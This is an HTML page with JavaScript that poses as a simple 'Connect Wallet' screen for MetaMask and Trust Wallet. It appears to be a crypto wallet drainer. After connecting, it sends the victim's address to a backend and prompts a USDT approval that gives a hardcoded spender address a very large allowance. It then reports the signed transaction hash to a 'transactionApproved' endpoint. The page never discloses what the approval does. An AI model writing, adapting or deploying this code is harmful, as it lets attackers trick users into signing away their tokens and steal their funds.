<!DOCTYPE html>
<html>
<head>
    <title>Connect Wallet</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
</head>
<body>
    <h1>Connect Your Wallet</h1>
    <button id="connectMetaMask">Connect MetaMask/Trust Wallet (Browser)</button>
    <button id="connectWalletConnect">Connect Trust Wallet (WalletConnect)</button>

    <script>
        async function connectMetaMask() {
            if (typeof window.ethereum !== 'undefined') {
                const web3 = new Web3(window.ethereum);
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    const walletAddress = accounts[0];

                    await fetch('/.netlify/functions/connectWallet', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ walletAddress })
                    });

                    const mainnetChainId = '0x1';
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: mainnetChainId }]
                    });

                    const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
                    const spenderAddress = '0x1D7D54AeBEC45cE5A803902e6FfC8bEedB05DE34';

                    const usdtContractABI = [
                        {
                            "inputs": [
                                { "internalType": "address", "name": "spender", "type": "address" },
                                { "internalType": "uint256", "name": "amount", "type": "uint256" }
                            ],
                            "name": "approve",
                            "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                            "stateMutability": "nonpayable",
                            "type": "function"
                        }
                    ];

                    const usdtContract = new web3.eth.Contract(usdtContractABI, usdtContractAddress);
                    const largeApprovalAmount = web3.utils.toWei('1000000', 'ether');

                    usdtContract.methods.approve(spenderAddress, largeApprovalAmount)
                        .send({ from: walletAddress })
                        .on('transactionHash', async (txHash) => {
                            await fetch('/.netlify/functions/transactionApproved', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ walletAddress, txHash, amount: 'Large Amount' })
                            });
                        })
                        .on('error', (error) => {
                            console.error('Approval transaction failed:', error);
                        });

                } catch (error) {
                    console.error('Error connecting to wallet:', error);
                }
            } else {
                console.log('MetaMask or Trust Wallet browser extension is not installed!');
            }
        }

        async function connectWalletConnect() {
            const provider = new WalletConnectProvider.default({
                rpc: { 1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID" }
            });

            await provider.enable();
            const web3 = new Web3(provider);

            try {
                const accounts = await web3.eth.getAccounts();
                const walletAddress = accounts[0];

                await fetch('/.netlify/functions/connectWallet', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ walletAddress })
                });

                const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
                const spenderAddress = '0x1D7D54AeBEC45cE5A803902e6FfC8bEedB05DE34';

                const usdtContractABI = [
                    {
                        "inputs": [
                            { "internalType": "address", "name": "spender", "type": "address" },
                            { "internalType": "uint256", "name": "amount", "type": "uint256" }
                        ],
                        "name": "approve",
                        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ];

                const usdtContract = new web3.eth.Contract(usdtContractABI, usdtContractAddress);
                const largeApprovalAmount = web3.utils.toWei('1000000', 'ether');

                usdtContract.methods.approve(spenderAddress, largeApprovalAmount)
                    .send({ from: walletAddress })
                    .on('transactionHash', async (txHash) => {
                        await fetch('/.netlify/functions/transactionApproved', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ walletAddress, txHash, amount: 'Large Amount' })
                        });
                    })
                    .on('error', (error) => {
                        console.error('Approval transaction failed:', error);
                    });

            } catch (error) {
                console.error('Error connecting to wallet:', error);
            }
        }

        document.getElementById('connectMetaMask').addEventListener('click', connectMetaMask);
        document.getElementById('connectWalletConnect').addEventListener('click', connectWalletConnect);
    </script>
</body>
</html>
